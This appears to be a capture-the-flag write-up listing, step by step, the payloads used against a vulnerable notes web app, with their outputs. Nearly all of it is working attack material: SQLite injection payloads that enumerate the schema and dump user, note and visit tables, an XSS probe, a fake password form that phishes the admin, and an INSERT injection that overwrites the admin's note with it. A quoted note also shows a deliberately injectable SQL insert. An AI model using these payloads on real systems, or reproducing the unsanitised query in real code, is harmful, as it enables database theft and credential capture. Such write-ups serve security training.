In this document you can explore all the payloads used during the challenge in a more readable form.

> **Note!** Long lines of floors that were used for formatting purposes have been replaced with `\n` for better readability. During the original challenge this escape character didn't work properly, so I had to go for this less convenient solution. Other than that other slight modifications may have been made to make the document even more readable. You can access the original, unchanged payloads in the `payloads` subdirectory.

### `sqli_test.json`
```json
{
  "2000": {
    "encrypted": 0,
    "note": "' + (SELECT sqlite_version()) + '",
    "title": "Injection Test"
  }
}
```
#### Output
```
3.4
```
#### Conclusions
We receive the version of the SQLite database, which means that the injection was successful and the app itself is vulnerable.

### `note_access.json`
```json
{
  "2001": {
    "encrypted": 0,
    "note": "' + (SELECT * FROM notes) + '",
    "title": "Notes"
  }
}
```
#### Output
```
Internal Server Error
The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
```
#### Conclusions
Directly accessing the `notes` table is not possible, but we can still look for different ways of retrieving the data.

### `first_note.json`
```json
{
  "2002": {
    "encrypted": 0,
    "note": "' + (SELECT id FROM notes) + '",
    "title": "First note ID?"
  }
}
```
#### Output
```
714
```
#### Conclusions
- We accessed the first note's ID, which means that we can overall access the `notes` table.
- Now we'll check if we can print second note's ID instead.

> **Note!** Received IDs, passwords and encrypted messages change upon each container relaunch! The outputs provided in this file simply contain my results from the challenge.

### `second_note.json`
```json
{
  "2003": {
    "encrypted": 0,
    "note": "' + (SELECT id FROM notes LIMIT 1 OFFSET 1) + '",
    "title": "Second note ID"
  }
}
```
#### Output
```
715
```
#### Conclusions
Printing second note's ID was successful, which means that we can access the entirety `notes` table.

### `table_attempt.json`
```json
{
  "2004": {
    "encrypted": 0,
    "note": "' + (SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%') + '",
    "title": "Tables names"
  }
}
```
#### Output
```
0
```
#### Conclusions
Printing the names of the tables was not successful, it returned 0 instead. That's where my first assumption came that I might have to modify my injection to get the desired result. 

### `table_count.json`
```json
{
  "2005": {
    "encrypted": 0,
    "note": "' + (SELECT count(*) FROM sqlite_master WHERE type='table') + '",
    "title": "Tables count"
  }
}
```
#### Output
```
3
```
#### Conclusions
Printing the number of tables was successful, which means that we can actually access the data in `sqlite_master`.

### `text_fix.json`
```json
{
  "2006": {
    "encrypted": 0,
    "note": "' || CAST((SELECT note FROM notes) AS TEXT) || '",
    "title": "Note displayed as text"
  }
}
```
#### Output
```
950902d52cf09d9c25bc476361119bfd.f0a6f3dfa5163aff51b4bd3123bb20db907a4532b58a9adf331948c787b14883ce87777b9b367a78b95a34ab9c771171696aca7087ed8da47f3496b6d7b55bea
```
#### Conclusions
- After manually casting the note as text, we received the note. This means that we can access the `notes` table properly.
- It looks like the data in here is encrypted, however it's too early to say anything valid about it.

### `table_names.json`
```json
{
  "2007": {
    "encrypted": 0,
    "note": "' || CAST((SELECT GROUP_CONCAT(name, ', ') FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%') AS TEXT) || '",
    "title": "Table names"
  }
}
```
#### Output
```
user, notes, visits
```
#### Conclusions
We finally managed to print the names of the tables. That puts us one step closer to dumping the entire database.

### `column_names.json`
```json
{
  "3001": {
    "encrypted": 0,
    "note": "' || CAST((SELECT GROUP_CONCAT(name, ' | ') FROM PRAGMA_table_info('user')) AS TEXT) || '",
    "title": "user"
  },
  "3002": {
      "encrypted": 0,
      "note": "' || CAST((SELECT GROUP_CONCAT(name, ' | ') FROM PRAGMA_table_info('notes')) AS TEXT) || '",
      "title": "notes"
  },
  "3003": {
      "encrypted": 0,
      "note": "' || CAST((SELECT GROUP_CONCAT(name, ' | ') FROM PRAGMA_table_info('visits')) AS TEXT) || '",
      "title": "visits"
  }
}
```
#### Output
```
user
username | password

notes
id | title | username | encrypted | note

visits
id | username | lastlogin | ip
```
#### Conclusions
Now that we have the column names, we can proceed to dump the data from the tables.

### `database_dump.json`
```json
{
  "3000": {
    "encrypted": 0,
    "note": "' || CAST((SELECT GROUP_CONCAT(name, ', ') FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%') AS TEXT) || '",
    "title": "tables"
  },
  "3001": {
    "encrypted": 0,
    "note": "' || CAST((SELECT GROUP_CONCAT(name, ' | ') FROM PRAGMA_table_info('user')) AS TEXT) || CAST((SELECT '\n') AS TEXT) || CAST((SELECT GROUP_CONCAT(rows, '\n') FROM (SELECT username || ' | ' || password AS rows FROM user)) AS TEXT) || '",
    "title": "user"
  },
  "3002": {
    "encrypted": 0,
    "note": "' || CAST((SELECT GROUP_CONCAT(name, ' | ') FROM PRAGMA_table_info('notes')) AS TEXT) || CAST((SELECT '\n') AS TEXT) || CAST((SELECT GROUP_CONCAT(rows, '\n') FROM (SELECT id || ' | ' || title || ' | ' || username || ' | ' || encrypted || ' | ' || note AS rows FROM notes)) AS TEXT) || '",
    "title": "notes"
  },
  "3003": {
    "encrypted": 0,
    "note": "' || CAST((SELECT GROUP_CONCAT(name, ' | ') FROM PRAGMA_table_info('visits')) AS TEXT) || CAST((SELECT '\n') AS TEXT) || CAST((SELECT GROUP_CONCAT(rows, '\n') FROM (SELECT id || ' | ' || username || ' | ' || lastlogin || ' | ' || ip AS rows FROM visits)) AS TEXT) || '",
    "title": "visits"
  }
}
```
#### Output (only `notes` table)
```
id | title | username | encrypted | note
714 | Hoist the colours! | admin | 1 | 950902d52cf09d9c25bc476361119bfd.f0a6f3dfa5163aff51b4bd3123bb20db907a4532b58a9adf331948c787b14883ce87777b9b367a78b95a34ab9c771171696aca7087ed8da47f3496b6d7b55bea
715 | Notes from meeting 08/01/24 | scotty | 0 |
We had a solid chat today about our note encryption logic. The hot topic was our combo of AES in CBC mode and PBKDF2 for key derivation. We tossed around a few new ideas for our PBKDF2 salt. Currently our approach looks something like that:
```
```python
key = PBKDF2(note_password, username, 16, count=1000000)
iv = get_random_bytes(16)
cipher = AES.new(key, AES.MODE_CBC, iv) 
note = cipher.encrypt(pad(content, 16))
```
```
Some suggested using some fancy extra data, rather than using the user’s username. After some discussion the team decided to keep it as is. Simple, straightforward, and gets the job done. We were also discussing the idea of adding column to the database which would store IV separately from note content (now we just convert both to hex and concatenate with a dot in between). Luckily boss decided that it would be additional work to me while I work on /restore endpoint, so we postponed it for later.

716 | Ideas for restore endpoint | scotty | 0 |
Here are some ideas I generated with ChatGPT for implementing restore endpoint:
```
```python
def restore():
username = current_user.id
notes =  # get json file from POST request

# put new notes into database (or replace old ones)
for element in notes:
    title, encrypted, note = element
    sql.execute(f"INSERT OR REPLACE INTO notes (username, note, id, encrypted, title) VALUES ('{username}', '{note}', {i}, {encrypted}, '{title}');")
```
```
Doesn’t look too bad.

I was searching StackOverflow as well but everyone was talking about some „sanitization” stuff (must google it later). Why to complicate things while it seems so simple? Stupid...
```

#### Conclusions
- We managed to dump the entire database, which means that we now have access to all the data that is stored in it.
- Both `scotty` and `admin` have fascinating notes. `admin`'s note is encrypted, while `scotty`'s notes aren't.
- We find out how the encryption logic works, which will be very helpful in actually decrypting the message after we gather all the necessary data.
- Other than that, we also discover the exact query used to insert new notes into the database which lets us know how to properly format our next SQL injection payload.

### `admin_notes.json`
```json
{
  "2011": {
    "encrypted": 0,
    "note": "' || CAST((SELECT GROUP_CONCAT(name, ' | ') FROM PRAGMA_table_info('notes')) AS TEXT) || CAST((SELECT '\n') AS TEXT) || CAST((SELECT GROUP_CONCAT(rows, '\n') FROM (SELECT id || ' | ' || title || ' | ' || username || ' | ' || encrypted || ' | ' || note AS rows FROM notes WHERE username = 'admin')) AS TEXT) || '",
    "title": "notes of admin"
  }
}
```
#### Output
```
id | title | username | encrypted | note
714 | Hoist the colours! | admin | 1 | 950902d52cf09d9c25bc476361119bfd.f0a6f3dfa5163aff51b4bd3123bb20db907a4532b58a9adf331948c787b14883ce87777b9b367a78b95a34ab9c771171696aca7087ed8da47f3496b6d7b55bea
```
#### Conclusions
- This payload let us access the `admin`'s note, which is encrypted.
- It'll also be very helpful in the later stages of the challenge.

### `xss_test.json`
```json
{
  "2012": {
    "encrypted": 0,
    "note": "<script>alert()</script>",
    "title": "XSS Test"
  }
}
```
#### Conclusions
The alert box popped up, which means that the app is vulnerable to XSS attacks.

### `fake_form.json`
```json
{
  "2013": {
    "encrypted": 0,
    "note": "<form action=\"/render\" method=\"post\"> <label for=\"password\">Note password: </label> <input type=\"password\" id=\"password\" name=\"markdown\"> <input type=\"submit\" id=\"decrypt\" value=\"Decrypt note\"> <input type=\"hidden\" id=\"title\" name=\"title\" value=\"note_password\"> <input type=\"checkbox\" id=\"encrypted\" name=\"encrypted\" style=\"display: none;\"> </form>",
    "title": "Fake form"
  }
}
```
#### Conclusions
- Upon uploading that form as a note of mine, I can see that it's displayed as a form on the website.
- After clicking the `Decrypt note` button, the password (in plaintext) has been actually submitted to the database as a new note.

### `form_injection.json`
```json
{
  "2014": {
    "encrypted": 0,
    "note": "', 2014, 0, 'Dump note'), ('admin', '<form action=\"/render\" method=\"post\"> <label for=\"password\">Note password: </label> <input type=\"password\" id=\"password\" name=\"markdown\"> <input type=\"submit\" id=\"decrypt\" value=\"Decrypt note\"> <input type=\"hidden\" id=\"title\" name=\"title\" value=\"note_password\"> <input type=\"checkbox\" id=\"encrypted\" name=\"encrypted\" style=\"display: none;\"> </form>', 714, 0, 'Hoist the colours!'); --",
    "title": "Doesn't matter - it's overwritten anyways!"
  }
}
```
#### Result
```
note_password
dq1shHUb
```
#### Conclusions
- The `admin` still thinks he needs to input the password to access the note. However, he doesn't realize it's a fake form that submits the password to the database as a note.
- This password can be then used to decrypt the note. We can access it by dumping the `notes` of the `admin` again using SQL injection.
